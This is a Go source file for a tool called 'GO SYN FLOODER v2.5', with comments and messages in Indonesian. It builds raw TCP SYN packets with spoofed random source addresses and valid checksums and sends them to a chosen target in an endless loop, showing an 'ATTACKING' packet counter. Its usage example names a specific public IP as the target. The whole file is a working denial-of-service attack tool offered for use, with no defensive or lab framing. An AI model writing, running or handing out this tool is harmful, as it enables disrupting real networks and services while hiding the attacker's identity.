package main

import (
        "crypto/rand"
        "encoding/binary"
        "flag"
        "fmt"
        "net"
        "os"
        "syscall"
        "time"
)

// Kode Warna ANSI untuk Tampilan Terminal
const (
        Reset   = "\033[0m"
        Red     = "\033[31m"
        Green   = "\033[32m"
        Yellow  = "\033[33m"
        Blue    = "\033[34m"
        Cyan    = "\033[36m"
        Bold    = "\033[1m"
        Dim     = "\033[2m"
)

func checksum(data []byte) uint16 {
        var sum uint32
        for i := 0; i < len(data)-1; i += 2 {
                sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
        }
        if len(data)%2 == 1 {
                sum += uint32(data[len(data)-1]) << 8
        }
        for sum > 0xffff {
                sum = (sum & 0xffff) + (sum >> 16)
        }
        return uint16(^sum)
}

func getRandomIP() [4]byte {
        var ip [4]byte
        for {
                rand.Read(ip[:])
                if ip[0] != 0 && ip[0] != 10 && ip[0] != 127 && ip[0] != 192 && ip[0] < 240 {
                        break
                }
        }
        return ip
}

func getRandomPort() uint16 {
        var b [2]byte
        rand.Read(b[:])
        port := binary.BigEndian.Uint16(b[:])
        if port < 1024 {
                port += 1024
        }
        return port
}

func main() {
        // Flag/Argumen Command Line
        targetIPStr := flag.String("t", "", "IP Target")
        targetPort := flag.Int("p", 80, "Port Target")
        ifaceName := flag.String("i", "eth0", "Interface Jaringan")
        debugMode := flag.Bool("d", false, "Aktifkan mode debug lalu lintas jaringan (tampilan detail)")
        flag.Parse()

        if *targetIPStr == "" {
                fmt.Printf("%s[!] Error: IP Target wajib diisi! Gunakan flag -t%s\n", Red, Reset)
                fmt.Println("Contoh: sudo ./gosynflood -t 45.192.223.67 -i eth0 -p 80 -d")
                os.Exit(1)
        }

        targetIP := net.ParseIP(*targetIPStr).To4()
        if targetIP == nil {
                fmt.Printf("%s[!] Error: Format IP Target tidak valid!%s\n", Red, Reset)
                os.Exit(1)
        }

        // --- BANNER TAMPILAN KEREN ---
        fmt.Printf("%s%s==================================================%s\n", Bold, Cyan, Reset)
        fmt.Printf("%s%s                GO SYN FLOODER v2.5               %s\n", Bold, Yellow, Reset)
        fmt.Printf("%s%s==================================================%s\n", Bold, Cyan, Reset)
        fmt.Printf(" Target IP   : %s%s%s\n", Bold, Green, *targetIPStr)
        fmt.Printf(" Target Port : %s%d%s\n", Bold, Yellow, *targetPort)
        fmt.Printf(" Interface   : %s%s%s\n", Bold, Blue, *ifaceName)
        fmt.Printf(" Packet Type : %sTCP SYN (Murni)%s\n", Bold, Red)
        
        modeText := fmt.Sprintf("%sSTANDAR (Kecepatan Tinggi)%s", Green, Reset)
        if *debugMode {
                modeText = fmt.Sprintf("%sDEBUG LALU LINTAS (Detail Paket)%s", Red, Reset)
        }
        fmt.Printf(" Mode Tampil : %s\n", modeText)
        fmt.Printf("%s%s==================================================%s\n", Bold, Cyan, Reset)
        fmt.Printf("%s[*] Menyiapkan socket...%s\n", Yellow, Reset)
        time.Sleep(800 * time.Millisecond)

        fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
        if err != nil {
                fmt.Printf("%s[!] Gagal membuat socket: %v (Butuh akses root/sudo)%s\n", Red, err, Reset)
                os.Exit(1)
        }
        defer syscall.Close(fd)

        err = syscall.BindToDevice(fd, *ifaceName)
        if err != nil {
                fmt.Printf("%s[!] Gagal mengikat ke interface %s: %v%s\n", Red, *ifaceName, err, Reset)
                os.Exit(1)
        }

        var destAddr [4]byte
        copy(destAddr[:], targetIP)
        sockAddr := syscall.SockaddrInet4{
                Port: *targetPort,
                Addr: destAddr,
        }

        packet := make([]byte, 40)

        // IP Header
        packet[0] = 0x45
        packet[1] = 0x00
        binary.BigEndian.PutUint16(packet[2:4], 40)
        binary.BigEndian.PutUint16(packet[4:6], 54321)
        binary.BigEndian.PutUint16(packet[6:8], 0x0000)
        packet[8] = 64
        packet[9] = 6
        copy(packet[16:20], targetIP)

        // TCP Header
        binary.BigEndian.PutUint16(packet[22:24], uint16(*targetPort))
        binary.BigEndian.PutUint32(packet[24:28], 1234567)
        binary.BigEndian.PutUint32(packet[28:32], 0) // No ACK
        packet[32] = 0x50
        packet[33] = 0x02 // SYN

        binary.BigEndian.PutUint16(packet[34:36], 1024)

        fmt.Printf("%s[+] Flooding dimulai! Menyerang target...%s\n\n", Green, Reset)

        var totalSent uint64 = 0
        var lastSent uint64 = 0
        ticker := time.NewTicker(1 * time.Second)
        defer ticker.Stop()

        // Tampilan real-time counter hanya aktif jika BUKAN mode debug
        if !*debugMode {
                go func() {
                        for range ticker.C {
                                pps := totalSent - lastSent
                                lastSent = totalSent
                                fmt.Printf("\r%s[ATTACKING]%s Terkirim: %s%d%s paket | Kecepatan: %s%d%s pkt/det",
                                        Red, Reset, Bold, totalSent, Reset, Green, pps, Reset)
                        }
                }()
        }

        // Loop utama pengiriman paket
        for {
                srcIP := getRandomIP()
                srcPort := getRandomPort()

                copy(packet[12:16], srcIP[:])
                packet[10] = 0x00
                packet[11] = 0x00
                binary.BigEndian.PutUint16(packet[10:12], checksum(packet[0:20]))

                binary.BigEndian.PutUint16(packet[20:22], srcPort)

                packet[36] = 0x00
                packet[37] = 0x00
                pseudoHeader := make([]byte, 12+20)
                copy(pseudoHeader[0:4], srcIP[:])
                copy(pseudoHeader[4:8], targetIP)
                pseudoHeader[8] = 0
                pseudoHeader[9] = 6
                binary.BigEndian.PutUint16(pseudoHeader[10:12], 20)
                copy(pseudoHeader[12:], packet[20:40])

                binary.BigEndian.PutUint16(packet[36:38], checksum(pseudoHeader))

                err := syscall.Sendto(fd, packet, 0, &sockAddr)
                
                if err == nil {
                        totalSent++
                        if *debugMode {
                                // Tampilan Log Lalu Lintas Jaringan yang Keren (Mode Debug)
                                timestamp := time.Now().Format("15:04:05.000")
                                fmt.Printf("[%s] %sOUT%s %d.byte %sTCP_SYN%s | %d.%d.%d.%d:%d -> %s:%d %s[OK]%s\n",
                                        timestamp, Blue, Reset, len(packet), Red, Reset,
                                        srcIP[0], srcIP[1], srcIP[2], srcIP[3], srcPort,
                                        *targetIPStr, *targetPort, Green, Reset)
                        }
                } else if *debugMode {
                        // Log jika ada paket yang gagal terkirim di mode debug
                        timestamp := time.Now().Format("15:04:05.000")
                        fmt.Printf("[%s] %sERR%s Gagal mengirim paket dari port %d: %v\n", 
                                timestamp, Red, Reset, srcPort, err)
                }
        }
}

